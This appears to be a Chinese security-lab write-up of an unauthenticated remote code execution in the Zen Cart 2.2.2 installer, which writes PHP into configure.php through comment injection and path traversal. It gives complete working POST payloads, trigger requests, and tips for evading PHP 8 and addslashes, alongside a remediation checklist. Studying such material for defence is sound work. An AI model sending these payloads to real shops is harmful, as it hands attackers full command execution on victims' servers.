#  同一个漏洞，两种 payload： Zen Cart 零权限 RCE 的两次实战  
原创 YNsec
                        YNsec  YNsec安全实验室   2026-10-19 11:19  
  
# 同一个漏洞，两种 payload：Zen Cart 零权限 RCE 的两次实战  
  
安全研究 · 漏洞利用链拆解 · 靶场实录  
  
摘要  
两个靶标、同一条链、同一个函数，却必须写两套完全不同的 payload。本文拆解 zcConfigureFileWriter 的「注释注入」，讲清一件事：一个能跑的脚本，为什么换台机器就废了。  
  
**免责声明：**  
本文所述测试全部在授权靶场环境中完成，目标地址、主机名与凭据均已脱敏（IP 使用 RFC5737 文档专用地址段）。内容仅用于安全学习与防御加固，请勿用于任何未授权测试。  
## 一、先说结果  
  
两个靶标，跑的都是 **Zen Cart 2.2.2**  
，都留着 zc_install/  
 这个安装目录。两条链的结果一模一样：  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">项目</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">结果</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;font-weight: 600;"><section><span leaf="">攻击者起点</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">手上什么都没有（无 Cookie / Token / Session / 账号）</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;font-weight: 600;"><section><span leaf="">链路长度</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><strong><span leaf="">1 步</span></strong><section><span leaf="">（单漏洞即成链，无需任何辅助漏洞）</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;font-weight: 600;"><section><span leaf="">最终权限</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 12.5px;"><span leaf="">apache</span></code><section><span leaf="">（uid=48），命令直接回显</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;font-weight: 600;"><section><span leaf="">CVSS</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><strong><span leaf="">9.8</span></strong><section><span leaf="">（AV:N / AC:L / PR:N / UI:N / C:H / I:H / A:H）</span></section></td></tr></tbody></table>  
这意味着：网络可直接访问、不需要任何认证、不需要用户交互、机密性完整性可用性全 High —— 漏洞评级里最难看的那个档位。  
  
但这两条链用的**并不是两个漏洞**  
。同一个函数 zcConfigureFileWriter  
、同一个注释闭合技巧、同一个落点，唯一的差别是 **payload 怎么写**  
。  
  
而这个差别，恰恰是整件事最值得看的地方。  
## 二、入口：一扇不需要钥匙的门  
  
Zen Cart 安装完之后，zc_install/  
 目录默认还躺在那儿。它的关键特征是——**完全独立于主应用的认证系统**  
：不读 Session、不校验登录态、不看管理员标记。  
  
直接访问安装向导首页，返回 200，不需要登录：  
  
HTTP 请求  
  
GET /zc_install/index.php?main_page=admin_setup HTTP/1.1  
Host: 192.0.2.30:8080  
  
换句话说：只要这个目录还能从外网访问，你就等于在产品旁边开了一扇不用钥匙的门。而绝大多数「装完就走」的部署，这扇门一直开着。  
  
前置条件少得可怜：  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">条件</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: center;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">状态</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">zc_install 目录可 HTTP 访问</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: center;"><section><span leaf="">✅</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">未删除，返回 200</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">PHP 文件可被解析执行</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: center;"><section><span leaf="">✅</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">Apache + PHP 8.2.31</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">includes/ 目录 Web 用户可写</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: center;"><section><span leaf="">✅</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">文件属主 apache</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">攻击者持有账号</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: center;"><section><span leaf="">❌</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">不需要，零凭据</span></section></td></tr></tbody></table>## 三、原理：把 PHP 代码塞进一段注释里  
  
安装向导要把配置写进 configure.php  
，用的是模板替换。模板开头有这么一行：  
  
模板原文（被污染的那一行）  
  
<?php  
/**  
 * @license http://www.zen-cart.com/license/2_0.txt  
 * File Built by %%_INSTALLER_METHOD_%% on %%_DATE_NOW_%%  
 */  
  
注意 %%_INSTALLER_METHOD_%%  
 这个占位符——它待在一段 /* ... */  
 多行注释里面。而 installer_method  
 这个字段，会被 str_replace()  
 **原样**  
替换进去。  
  
于是攻击者只需要做三件事：  
1. 用 */  
 把注释关掉；  
  
1. 写自己的 PHP 代码；  
  
1. 再用 /*  
 把注释重新打开，让模板剩下的部分继续被注释吞掉，保证语法不出错。  
  
💡 这个三段式结构 **「*/ + 任意 PHP + /*」**  
 是整条链的核心。它不需要你控制文件名、不需要你找到包含点，只要有一处「用户输入被塞进注释」的地方，就能变成代码执行。  
  
再配合路径遍历：physical_path  
 只做了 rtrim()  
 就拼上 /includes/configure.php  
，不校验 ../  
。传个 .  
 或绝对路径，写出来的文件就落在 Web 根目录下，Apache 直接解析。  
  
完整的污点链路：  
  
漏洞触发链  
  
$_POST['installer_method']          ← 用户可控，零权限  
  │  
  ▼ application_top.php:111   zen_sanitize_request() → addslashes()  
  │    ⚠ 只转义 ' " \ NUL，payload 不含这几个字符就原样通过  
  │  
  ▼ admin_setup/header_php.php:28   new zcConfigureFileWriter($_POST)  
  │  
  ▼ transformConfigureTplFile():96  
  │    str_replace('%%_INSTALLER_METHOD_%%', payload, $tpl)  
  │    模板头变成：  
  │      * File Built by */  <payload>  /* on ...  
  │                        ↑ 注释在此关闭，代码脱离注释上下文  
  │  
  ▼ file_put_contents($outputFile, $tplOriginal)  
  │    覆盖 {physical_path}/includes/configure.php  
  │  
  ▼ 任意后续请求 → require configure.php → <payload> 执行  
## 四、真正的坑：现成的 payload 为什么跑不动  
  
这一节是两份报告里最有价值的部分，也是我建议大家重点看的。  
### 坑一：PHP 8 不认「裸常量」  
  
网上流传的旧 PoC 长这样：  
  
旧 PoC（PHP 7 可用）  
  
*/ system($_GET[cmd]); /*  
  
在 PHP 7 里，cmd  
 是一个「未定义常量」，PHP 会宽容地把它当成字符串 'cmd'  
，只丢一个 warning，照跑不误。  
  
而 PHP 8 把这件事从 warning 升级成了 **Fatal error**  
。结果是：HTTP 500、响应体空白、什么都不回显。第一次实测就是 500 空响应，看上去像「漏洞不存在」。  
  
改法有两个动作：  
- 用 current($_GET)  
 取代 $_GET[cmd]  
 —— 取数组第一个元素的值，不需要任何字符串键，彻底绕开未定义常量；  
  
- 末尾补一个 exit;  
 —— 因为模板后半段还有没被替换的 %%_..._%%  
 占位符，PHP 8 同样视为未定义常量，会在你拿到回显之前把进程打断。  
  
### 坑二：addslashes 会把你的引号全毁掉  
  
zen_sanitize_request()  
 对 POST 值统一做 addslashes()  
，转义 '  
、"  
、\  
 和 NUL。  
  
这意味着——**你的 payload 里一个引号都不能出现**  
。而绝大多数人写 payload 的第一反应就是带引号。  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">尝试的写法</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">失败原因</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">结果</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">双引号字符串</span><br/><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">echo &#34;MARK:&#34;.shell_exec($_GET[&#34;v1&#34;])</span></code></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">&#34;</span></code><section><span leaf=""> 变成 </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">\&#34;</span></code><span leaf="">，在代码上下文里是语法错误</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">❌ 500</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">单引号闭合</span><br/><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">mysql&#39;;phpinfo();//</span></code></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">\&#39;</span></code><section><span leaf=""> 在 PHP 单引号字符串里是</span><strong><span leaf="">合法转义</span></strong><span leaf="">，字符串不闭合</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">❌ 注入失败</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">整数键 + 无字符串</span><br/><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">$_GET[1]</span></code></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">payload 里没有 </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">&#39; &#34; \</span></code><span leaf="">，addslashes 无从下手</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">✅ 成功</span></section></td></tr></tbody></table>  
第三次才成的 payload：  
  
最终 payload（零引号）  
  
*/ if(isset($_GET[1])){echo shell_exec($_GET[1]);} /*  
  
整数键 $_GET[1]  
 替代字符串键，函数体里也不出现任何字符串字面量 —— 整个 payload 里找不到可以被 addslashes  
 处理的字符。  
  
⚠️ **这就是本文最想说的那句话：payload 的「能用」是有前置条件的。**  
 它同时依赖目标机的 PHP 版本、过滤函数、以及你有没有把引号带进去。同一份 PoC 昨天能打，今天换台机器就是 500 空响应 —— 这不是漏洞没了，是你的写法过时了。  
## 五、两次实战，两套写法  
### A 版：用 current($_GET) 兼容 PHP 8  
  
这一步只需要一个 POST，全程无 Cookie、无 Token：  
  
HTTP 请求 · 无任何凭据  
  
POST /zc_install/index.php?main_page=admin_setup HTTP/1.1  
Host: 192.0.2.30:8080  
Content-Type: application/x-www-form-urlencoded  
http_server_catalog=http://example.com  
&installer_method=*/ system(current($_GET)); exit; /*  
&physical_path=.  
  
写入成功后，服务端 configure.php  
 的头部变成这样：  
  
写入后的文件头  
  
<?php  
/**  
 * @copyright Copyright 2003-2025 Zen Cart Development Team  
 * @license http://www.zen-cart.com/license/2_0.txt  
 * File Built by */ system(current($_GET)); exit; /* on Tue Jun 30 2026 02:27:35  
 */  
  
注释在 */  
 处关闭，代码落进执行上下文，末尾的 /*  
 再把剩余模板吞回去。语法完美。  
  
然后访问这个文件，随便带一个参数：  
  
HTTP 请求  
  
GET /zc_install/includes/configure.php?cmd=id HTTP/1.1  
Host: 192.0.2.30:8080  
  
响应  
  
uid=48(apache) gid=48(apache) groups=48(apache)  
  
current($_GET)  
 取到第一个参数值 'id'  
，交给 system()  
 执行并回显。攻击者甚至不需要知道参数名叫什么。  
### B 版：用整数键绕开 addslashes  
  
另一台靶标同样是零凭据，但 payload 换成了「整份安装参数 + 无引号注入」：  
  
HTTP 请求 · 无任何凭据  
  
POST /zc_install/index.php?main_page=admin_setup HTTP/1.1  
Host: 192.0.2.40:8080  
Content-Type: application/x-www-form-urlencoded  
physical_path=/home/source_code/zencart-2.2.2  
&adminDir=admin  
&db_type=mysql  
&db_host=localhost  
&installer_method=*/ if(isset($_GET[1])){echo shell_exec($_GET[1]);} /*  
&...（其余安装参数照填，越完整越像正常安装）  
  
触发用的是整数参数名 1  
：  
  
HTTP 请求  
  
GET /?1=id HTTP/1.1  
Host: 192.0.2.40:8080  
  
命令输出直接打在页面 HTML 之前：  
  
响应  
  
uid=48(apache) gid=48(apache) groups=48(apache)  
<!DOCTYPE html>  
<html dir="ltr" lang="en">  
  <head>  
  ...  
  
💡 注意 B 版有个细节：它覆盖的是 **两处**  
 configure.php（前台一份、后台一份）。因为主应用的每个请求都会 require  
 这个文件，所以注入点等于**全站常驻**  
，不依赖你去敲那个特定的 URL。  
## 六、取证：别让「回显了」骗了你  
  
拿到一个 uid=...  
 就算成功了吗？不够。回显可能来自缓存、来自某个中间层，甚至来自别人的截图。  
  
两份报告都做了同一件事：**写一个带唯一时间戳的标记，再自己读回来**  
。B 版跑了三轮，每轮标记都不同，全部命中：  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">轮次</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">写入的唯一标记</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">读回结果</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">1</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">VE0177_PROOF_RUN1_2842654</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">✅ 一致</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">2</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">VE0177_PROOF_RUN2_9128405</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">✅ 一致</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">3</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">VE0177_PROOF_RUN3_1078861</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">✅ 一致</span></section></td></tr></tbody></table>  
这三轮标记互相不同，且带纳秒级后缀，基本排除了缓存与巧合。文件属主是 apache:apache  
，也说明确实是 Web 进程写的。  
  
而 A 版那边有个更有意思的旁证 ——  
  
💡 用 root 通过 SSH 去读那个标记文件，**读不到**  
；但通过 RCE cat  
 却能读出来。  
  
原因是 httpd 启用了 PrivateTmp=yes  
（systemd 沙箱），apache 进程看到的 /tmp  
 是私有命名空间，和 root 的 /tmp  
 不是同一个。  
  
这个「读不到」，恰恰**证明了命令真的跑在 apache 的服务上下文里**  
，而不是任何中间层伪造出来的回显。有时候，一个「失败」比成功更有说服力。  
## 七、两条链放在一起看  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">对比项</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">A 版（VE-0175）</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">B 版（VE-0177）</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">payload</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">system(current($_GET))</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">shell_exec($_GET[1])</span></code></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">解决什么</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">PHP 8 未定义常量（Fatal error）</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">addslashes 转义引号（语法错误）</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">触发方式</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">访问被写入的 configure.php</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">访问站点任意页面，</span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">?1=cmd</span></code></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">path 参数</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">.</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">绝对路径</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">额外防御</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">补 </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">exit;</span></code><span leaf=""> 防占位符炸掉回显</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">isset()</span></code><section><span leaf=""> 判空，避免空参数报错</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">最终权限</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">apache（uid=48）</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">apache（uid=48）</span></section></td></tr></tbody></table>  
看明白了吗？**漏洞是同一个，差别全在「适配目标环境」这四个字上。**  
 A 版适配 PHP 8 的严格性，B 版适配过滤函数的转义规则。写 exploit 这件事，本质上是和环境谈判。  
## 八、修复清单  
  
最高优先级，今天就能做  
1. **生产环境直接删掉 zc_install/ 目录。**  
 装完就不该留着，这一步能干掉本文整条链。  
  
1. 如果业务上必须保留，就给这个目录加 **IP 白名单**  
或 **Basic Auth**  
，别让它对外裸奔。  
  
清理命令  
  
rm -rf /path/to/zencart-2.2.2/zc_install/  
  
代码层加固  
1. **完成态校验**  
：configure.php  
 已存在就拒绝重写，或要求管理员二次认证；  
  
1. **过滤模板变量**  
：installer_method  
 禁止 */  
 与 /*  
 序列；更彻底的做法是把它写进字面字符串里，而不是裸注释内；  
  
1. **路径校验**  
：physical_path  
 用 realpath()  
 比对前缀，拒绝 ..  
 和任意绝对路径；  
  
1. **别把 addslashes 当万能过滤**  
：它只适合「字符串上下文」，对代码上下文毫无意义。按输出语境做编码才是正解。  
  
运行层兜底  
1. disable_functions  
 里禁掉 shell_exec  
 / system  
 / exec  
 / passthru  
（深度防御，不能替代前两条）；  
  
1. display_errors  
 关掉、log_errors  
 打开 —— 但要注意：这也意味着真实的报错被藏起来了，需要配合日志告警；  
  
1. 验证做完记得清残留：恢复原始 configure.php  
、删掉标记文件。  
  
## 写在最后  
  
这两份报告放在一起看，比单独看任何一份都有意思。我想留下三点：  
1. **安装目录是「产品自带的第二套认证」，而它通常没有认证。**  
 主应用做得再严，旁边那个忘了删的安装向导会把一切清零。  
  
1. **payload 是环境相关的，不是万能钥匙。**  
 一份能跑的 PoC 背后，是 PHP 版本、过滤函数、字符集、配置项的连环妥协。看到 500 先别下结论说「不存在」，先怀疑自己的写法。  
  
1. **回显不等于成功。**  
 能自己造一个唯一的「证据」并读回来，才算真的打通。有时候「root 读不到、但 RCE 能读到」，反而是最硬的证明。  
  
至于防御，思路一如既往地简单：**把链条上任意一环掐断，链就断了。**  
 而这两条链上最便宜、最有效的那一刀，就是 rm -rf zc_install/  
。  
  
觉得有收获？  
  
点个「在看」和「赞」，顺手检查一下你负责的系统里还有没有忘记删的安装目录 👇  
下一期拆「ILIAS」。  
  
  
